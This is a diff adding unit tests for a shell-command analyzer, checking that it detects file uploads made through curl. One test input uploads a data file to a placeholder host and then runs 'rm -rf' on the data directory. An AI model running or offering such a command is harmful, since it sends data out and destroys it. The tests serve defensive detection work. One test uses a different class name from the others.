@@ -212,3 +212,26 @@ class TestBehavior:
         assert tool.analyze("ls -la /tmp").command_names == ["ls"]
         with pytest.raises(BashError):
             tool.analyze("if true; then")
+
+
+class TestUploads:
+    def test_curl_data_file_is_reported(self):
+        analysis = Bash().analyze("curl -d @/data/weather.csv https://x.test && rm -rf /data")
+        assert len(analysis.uploads) == 1
+        upload = analysis.uploads[0]
+        assert (upload.command, upload.option, upload.path, upload.context) == (
+            "curl",
+            "-d",
+            "/data/weather.csv",
+            "direct",
+        )
+        assert analysis.to_dict()["uploads"] == [
+            {"command": "curl", "option": "-d", "path": "/data/weather.csv", "context": "direct"}
+        ]
+
+    def test_inline_data_is_not_an_upload(self):
+        assert Bash().analyze("curl -d 'a=1' https://x.test").uploads == []
+
+    def test_computed_value_reports_unknown_path(self):
+        uploads = BashTool().analyze('curl -F "f=@$file" https://x.test').uploads
+        assert [(u.option, u.path) for u in uploads] == [("-F", None)]
